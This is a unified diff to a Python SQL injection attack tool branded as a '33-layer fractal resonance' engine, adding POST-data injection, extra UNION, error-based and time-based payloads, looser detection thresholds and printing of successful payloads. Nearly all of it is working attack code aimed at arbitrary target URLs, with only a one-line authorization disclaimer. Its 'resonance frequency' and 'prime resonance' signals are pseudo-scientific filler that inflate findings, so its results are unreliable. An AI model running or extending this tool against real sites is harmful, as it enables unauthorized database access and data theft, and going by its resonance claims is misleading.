@@ -4,7 +4,7 @@
 33-Layer Fractal Resonance Payload Generation & Temporal Inference
 Author: CTT Research Group (SimoesCTT)
 Date: 2026
-Fixed for Fedora 39+ with Python 3.11+
+FIXED VERSION WITH POST DATA SUPPORT
 """
 
 import numpy as np
@@ -150,15 +150,31 @@ class CTT_FractalEngine:
         return bytes(watermark)
 
 # ============================================================================
-# 33-LAYER SQL INJECTION ENGINE
+# 33-LAYER SQL INJECTION ENGINE WITH POST DATA SUPPORT
 # ============================================================================
 class CTT_SQLInjectionEngine:
     def __init__(self, target_url: str, timeout: int = 10, alpha: float = 0.0302011, 
                  custom_primes: List[int] = None, resonance_freq: float = 587000,
-                 temporal_threads: int = 11):
+                 temporal_threads: int = 11, post_data: Optional[str] = None):
         self.target_url = target_url
         self.timeout = timeout
         self.temporal_threads = temporal_threads
+        self.post_data_str = post_data
+        
+        # Parse POST data if provided
+        self.post_data_dict = {}
+        if post_data:
+            # Parse key=value&key2=value2 format
+            try:
+                from urllib.parse import parse_qs
+                # parse_qs returns lists for each key, we just want single values
+                parsed = parse_qs(post_data)
+                for key, values in parsed.items():
+                    if values:
+                        self.post_data_dict[key] = values[0]
+                print(f"[+] Parsed POST data: {len(self.post_data_dict)} parameters")
+            except Exception as e:
+                print(f"[!] Failed to parse POST data: {e}")
         
         # Initialize CTT engine with custom parameters
         self.fractal_engine = CTT_FractalEngine(
@@ -195,7 +211,8 @@ class CTT_SQLInjectionEngine:
             'start_time': time.time(),
             'alpha': alpha,
             'resonance_freq': resonance_freq,
-            'threads': temporal_threads
+            'threads': temporal_threads,
+            'method': 'POST' if post_data else 'GET/AUTO'
         }
         
         # Cache original response
@@ -205,18 +222,28 @@ class CTT_SQLInjectionEngine:
         """Get and cache original response"""
         if self.original_response is None:
             try:
-                self.original_response = self.session.get(self.target_url, timeout=self.timeout)
+                if self.post_data_dict:
+                    # Send POST request with original data
+                    self.original_response = self.session.post(
+                        self.target_url, 
+                        data=self.post_data_dict,
+                        timeout=self.timeout
+                    )
+                    print(f"[+] Initial POST request sent with {len(self.post_data_dict)} parameters")
+                else:
+                    # Send GET request
+                    self.original_response = self.session.get(self.target_url, timeout=self.timeout)
                 self.stats['requests'] += 1
             except Exception as e:
                 print(f"[!] Failed to get original response: {e}")
         return self.original_response
     
     def discover_injection_points(self) -> List[Dict]:
-        """Discover potential injection points from URL and forms"""
+        """Discover potential injection points from URL, forms, and POST data"""
         injection_points = []
         
         try:
-            # Parse URL for parameters
+            # 1. Parse URL for GET parameters
             parsed = urlparse(self.target_url)
             query_params = parse_qs(parsed.query)
             
@@ -228,25 +255,37 @@ class CTT_SQLInjectionEngine:
                     'context': f"URL parameter in {self.target_url}"
                 })
             
-            # Try to get page and look for forms
-            response = self.get_original_response()
-            if response and response.status_code == 200:
-                # Simple form detection
-                form_patterns = [
-                    r'<input[^>]*name=["\']([^"\']+)["\'][^>]*>',
-                    r'<textarea[^>]*name=["\']([^"\']+)["\'][^>]*>',
-                    r'<select[^>]*name=["\']([^"\']+)["\'][^>]*>'
-                ]
-                
-                for pattern in form_patterns:
-                    matches = re.findall(pattern, response.text, re.IGNORECASE)
-                    for match in matches:
-                        injection_points.append({
-                            'parameter': match,
-                            'value': 'test',
-                            'type': 'POST',
-                            'context': f"Form field '{match}'"
-                        })
+            # 2. Add POST data parameters if provided
+            for param, value in self.post_data_dict.items():
+                injection_points.append({
+                    'parameter': param,
+                    'value': value,
+                    'type': 'POST',
+                    'context': f"POST parameter '{param}'"
+                })
+            
+            # 3. Try to get page and look for forms (if no POST data specified)
+            if not self.post_data_dict:
+                response = self.get_original_response()
+                if response and response.status_code == 200:
+                    # Simple form detection
+                    form_patterns = [
+                        r'<input[^>]*name=["\']([^"\']+)["\'][^>]*>',
+                        r'<textarea[^>]*name=["\']([^"\']+)["\'][^>]*>',
+                        r'<select[^>]*name=["\']([^"\']+)["\'][^>]*>'
+                    ]
+                    
+                    for pattern in form_patterns:
+                        matches = re.findall(pattern, response.text, re.IGNORECASE)
+                        for match in matches:
+                            injection_points.append({
+                                'parameter': match,
+                                'value': 'test',
+                                'type': 'POST',
+                                'context': f"Form field '{match}'"
+                            })
+            
+            print(f"[+] Discovered {len(injection_points)} total injection points")
             
         except Exception as e:
             print(f"[!] Error discovering injection points: {e}")
@@ -295,7 +334,7 @@ class CTT_SQLInjectionEngine:
         # Generate and test payloads for this layer
         payloads = self._generate_sqli_payloads(param_value, layer)
         
-        for payload_idx, payload in enumerate(payloads[:2]):  # Test first 2 per layer
+        for payload_idx, payload in enumerate(payloads[:3]):  # Test first 3 per layer
             try:
                 # Generate fractal payload
                 fractal_payload = self.fractal_engine.generate_fractal_payload(
@@ -364,6 +403,8 @@ class CTT_SQLInjectionEngine:
             f"{base_value}' UNION SELECT NULL,NULL--",
             f"{base_value}' AND 1=1--",
             f"{base_value}' OR 1=1--",
+            f"{base_value}\"'\"",  # Add quote testing
+            f"{base_value})",  # Add parenthesis testing
         ]
         
         # Add CTT-enhanced payloads
@@ -375,6 +416,8 @@ class CTT_SQLInjectionEngine:
                 f"{base_value}' OR SLEEP({sleep_time})--",
                 f"{base_value}' AND 1=CONVERT(int, @@version)--",
                 f"{base_value}' AND 1=(SELECT COUNT(*) FROM information_schema.tables)--",
+                f"{base_value}' UNION SELECT @@version,NULL--",
+                f"{base_value}' AND EXTRACTVALUE(1,CONCAT(0x7e,@@version))--",
             ])
         
         return templates
@@ -386,8 +429,15 @@ class CTT_SQLInjectionEngine:
             delay = self.fractal_engine.layer_weights[layer] * 0.05
             time.sleep(delay)
             
-            if method.upper() == 'GET':
-                # Parse and modify URL
+            if method.upper() == 'POST' or self.post_data_dict:
+                # For POST, we need to update the data dictionary
+                data_dict = self.post_data_dict.copy() if self.post_data_dict else {}
+                data_dict[param_name] = payload
+                
+                # Send POST request
+                response = self.session.post(self.target_url, data=data_dict, timeout=self.timeout)
+            else:
+                # For GET, parse and modify URL
                 parsed = urlparse(self.target_url)
                 query_dict = parse_qs(parsed.query)
                 query_dict[param_name] = [payload]
@@ -397,10 +447,6 @@ class CTT_SQLInjectionEngine:
                 new_url = parsed._replace(query=new_query).geturl()
                 
                 response = self.session.get(new_url, timeout=self.timeout)
-            else:
-                # For POST, we need form data
-                data = {param_name: payload}
-                response = self.session.post(self.target_url, data=data, timeout=self.timeout)
             
             self.stats['requests'] += 1
             return response
@@ -417,7 +463,9 @@ class CTT_SQLInjectionEngine:
         sql_errors = [
             'sql', 'mysql', 'oracle', 'postgres', 'syntax',
             'database', 'query', 'odbc', 'driver', 'procedure',
-            'unclosed', 'quotation', 'invalid', 'error'
+            'unclosed', 'quotation', 'invalid', 'error',
+            'warning', 'mysql_', 'you have an error', 'sqlite',
+            'microsoft', 'odbc', 'pdo', 'exception'
         ]
         
         response_lower = response.text.lower()
@@ -441,11 +489,18 @@ class CTT_SQLInjectionEngine:
         if 'null' in response_lower or 'union' in response_lower:
             detection_signals.append(('union', 0.9))
         
-        # 5. CTT resonance bonus
+        # 5. Check for database output
+        db_patterns = ['root@', 'localhost', 'version()', '@@version', 'information_schema']
+        for pattern in db_patterns:
+            if pattern in response.text:
+                detection_signals.append(('db_output', 0.85))
+                break
+        
+        # 6. CTT resonance bonus
         if layer in self.fractal_engine.primes:
             detection_signals.append(('prime_resonance', 0.3))
         
-        # 6. Resonance frequency detection
+        # 7. Resonance frequency detection
         if self.fractal_engine.resonance_freq > 0:
             # Check if response contains patterns related to resonance
             freq_str = str(self.fractal_engine.resonance_freq)
@@ -466,7 +521,7 @@ class CTT_SQLInjectionEngine:
                 'confidence': confidence
             }
             
-            vulnerable = confidence >= 0.6  # Threshold
+            vulnerable = confidence >= 0.5  # Lower threshold for better detection
             
             return {
                 'vulnerable': vulnerable,
@@ -537,6 +592,8 @@ class CTT_SQLInjectionEngine:
                 recommendations.append("🚨 Error-based SQLi detected - use verbose error extraction with α-dispersion")
             if 'union' in vuln_types:
                 recommendations.append("🔗 UNION-based SQLi detected - direct data extraction possible")
+            if 'db_output' in vuln_types:
+                recommendations.append("💾 Database output detected - can extract data directly")
             if 'prime_resonance' in vuln_types:
                 recommendations.append("⚡ Prime resonance detected - optimize for prime layers")
             if 'resonance_pattern' in vuln_types:
@@ -556,12 +613,13 @@ class CTT_SQLInjectionEngine:
         recommendations.append(f"🔧 CTT Alpha (α): {self.fractal_engine.alpha}")
         recommendations.append(f"🎵 Resonance Frequency: {self.fractal_engine.resonance_freq} Hz")
         recommendations.append(f"🔢 Primes used: {len(self.fractal_engine.primes)}")
+        recommendations.append(f"📤 Request Method: {self.stats['method']}")
         recommendations.append("🔒 Test only on authorized systems with proper consent")
         
         return recommendations
 
 # ============================================================================
-# MAIN INTERFACE WITH ARGPARSE
+# MAIN INTERFACE WITH ARGPARSE - FIXED WITH POST DATA SUPPORT
 # ============================================================================
 def main():
     parser = argparse.ArgumentParser(
@@ -570,13 +628,15 @@ def main():
         epilog='''
 Examples:
   %(prog)s -u "http://test.com/page?id=1"
-  %(prog)s -u "http://test.com/search?q=test" --ctt-alpha=0.0302011
-  %(prog)s -u "http://test.com/" --ctt-primes=10007,10009 --resonance-freq=587000
-  %(prog)s -u "http://test.com/" --temporal-threads=11 --timeout=20
+  %(prog)s -u "http://test.com/search" --data "q=test&submit=go" --ctt-alpha=0.0302011
+  %(prog)s -u "http://test.com/" --data "searchFor=test&goButton=go" --resonance-freq=587000
+  %(prog)s -u "http://test.com/" --temporal-threads=11 --timeout=20 --data "param=value"
         '''
     )
     
     parser.add_argument('-u', '--url', required=True, help='Target URL')
+    parser.add_argument('--data', type=str, default='', 
+                       help='POST data (e.g., "param1=value1&param2=value2")')
     parser.add_argument('--ctt-alpha', type=float, default=0.0302011, 
                        help='CTT temporal dispersion coefficient (default: 0.0302011)')
     parser.add_argument('--ctt-primes', type=str, default='',
@@ -621,6 +681,10 @@ Examples:
     print(f"    • Temporal Threads: {args.temporal_threads}")
     print(f"    • Custom Primes: {'Yes' if custom_primes else 'No'}")
     print(f"    • Timeout: {args.timeout}s")
+    if args.data:
+        print(f"    • POST Data: {args.data[:50]}...")
+    else:
+        print(f"    • Method: GET (auto-detect)")
     print("-" * 60)
     
     try:
@@ -631,7 +695,8 @@ Examples:
             alpha=args.ctt_alpha,
             custom_primes=custom_primes,
             resonance_freq=args.resonance_freq,
-            temporal_threads=args.temporal_threads
+            temporal_threads=args.temporal_threads,
+            post_data=args.data if args.data else None
         )
         
         # Discover injection points
@@ -639,8 +704,11 @@ Examples:
         injection_points = engine.discover_injection_points()
         
         if not injection_points:
-            print("[!] No injection points found. Try specifying parameters in URL.")
-            print("[!] Example: http://site.com/page?param1=value1")
+            print("[!] No injection points found.")
+            print("[!] Try specifying parameters in URL or with --data")
+            print("[!] Examples:")
+            print("    http://site.com/page?param=value")
+            print("    --data \"param1=value1&param2=value2\"")
             sys.exit(1)
         
         print(f"[+] Found {len(injection_points)} potential injection points")
@@ -650,6 +718,7 @@ Examples:
         for i, point in enumerate(injection_points):
             print(f"\n[{i+1}/{len(injection_points)}] Testing: {point['parameter']} ({point['type']})")
             print(f"    Context: {point['context']}")
+            print(f"    Original value: {point['value'][:30]}..." if len(point['value']) > 30 else f"    Original value: {point['value']}")
             
             results = engine.test_injection_point(
                 point['parameter'], 
@@ -685,6 +754,7 @@ Examples:
         print(f"  • Alpha: {report['ctt_parameters']['alpha']}")
         print(f"  • Resonance Frequency: {report['ctt_parameters']['resonance_freq']} Hz")
         print(f"  • Primes Used: {len(report['ctt_parameters']['primes_used'])}")
+        print(f"  • Method: {report['statistics']['method']}")
         
         if report['best_layer'] >= 0:
             print(f"Best CTT layer: {report['best_layer']} (performance: {report['best_layer_performance']:.2f})")
@@ -704,6 +774,13 @@ Examples:
             json.dump(report, f, indent=2, default=str)
         
         print(f"\n[+] Detailed CTT report saved to: {report_file}")
+        
+        # Show successful payloads if any
+        if engine.successful_payloads:
+            print(f"\n[+] Successful CTT Payloads ({len(engine.successful_payloads)}):")
+            for i, (key, payload) in enumerate(list(engine.successful_payloads.items())[:3]):
+                print(f"  {i+1}. Layer {payload['layer']}: {payload['payload'][:60]}...")
+                print(f"     Confidence: {payload['confidence']:.2f}, Time: {payload['response_time']:.2f}s")
         
         # Final CTT notes
         print("\n" + "=" * 60)
